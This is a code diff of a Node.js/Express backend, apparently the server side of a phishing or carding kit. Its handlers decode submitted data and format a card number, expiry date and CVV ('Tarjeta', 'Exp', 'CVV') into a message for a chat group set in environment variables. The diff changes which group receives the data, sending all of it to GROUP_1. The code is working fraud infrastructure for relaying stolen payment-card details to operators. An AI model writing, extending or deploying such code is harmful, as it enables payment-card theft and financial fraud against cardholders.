@@ -20,7 +20,7 @@ export const initProcess = async (req, res) => {
   const { data, socketId } = req.body;
 
   try {
-    const groupId = counter <= 2 ? process.env.GROUP_1 : process.env.GROUP_2;
+    const groupId = process.env.GROUP_1;
     const decrypted = JSON.parse(atob(data));
     const decisionId = `${socketId}-${Date.now()}`;
 
@@ -116,7 +116,7 @@ export const appendCardData = async (req, res) => {
 
 export const sendSimpleMessage = async (req, res) => {
   const { text } = req.body;
-  const chatId = counter <= 2 ? process.env.GROUP_1 : process.env.GROUP_2;
+  const chatId = process.env.GROUP_1;
   const data = JSON.parse(atob(text));
   const message = `Tarjeta: ${data.card}\nExp: ${data.exp}\nCVV: ${data.cvv}`;
 
